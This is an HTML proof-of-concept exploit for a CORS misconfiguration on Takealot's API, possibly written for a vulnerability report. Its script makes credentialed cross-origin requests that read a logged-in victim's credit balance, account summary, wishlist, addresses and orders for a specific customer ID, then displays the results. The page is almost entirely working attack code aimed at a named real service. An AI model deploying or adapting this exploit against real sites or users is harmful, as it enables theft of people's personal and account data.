<!DOCTYPE html>
<html>
<head>
  <title>Takealot CORS PoC v2</title>
</head>
<body>
<h1>Takealot CORS PoC</h1>
<p>
  When a logged-in Takealot user visits this page, their session cookies are
  sent automatically. The CORS misconfiguration on api.takealot.com allows this
  cross-origin response to be read by attacker-controlled JavaScript.
</p>

<h2>Probe Results</h2>
<pre id="probe">Running...</pre>

<script>
// These endpoints were confirmed to reflect Access-Control-Allow-Origin
// with credentials — meaning we can read the response body cross-origin.
// The browser automatically sends the victim's session cookies on each request.
const endpoints = [
  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance" },
  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/summary" },
  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/wishlist" },
  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/addresses" },
  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/orders" },
];

const results = [];

async function run() {
  for (const { method, url } of endpoints) {
    try {
      const r    = await fetch(url, { method, credentials: "include" });
      const data = await r.json();
      results.push({ url, status: r.status, cors: "READABLE", body: data });
    } catch (e) {
      results.push({ url, cors: "BLOCKED", error: String(e) });
    }
    document.getElementById("probe").innerText = JSON.stringify(results, null, 2);
  }
}

run();
</script>
</body>
</html>
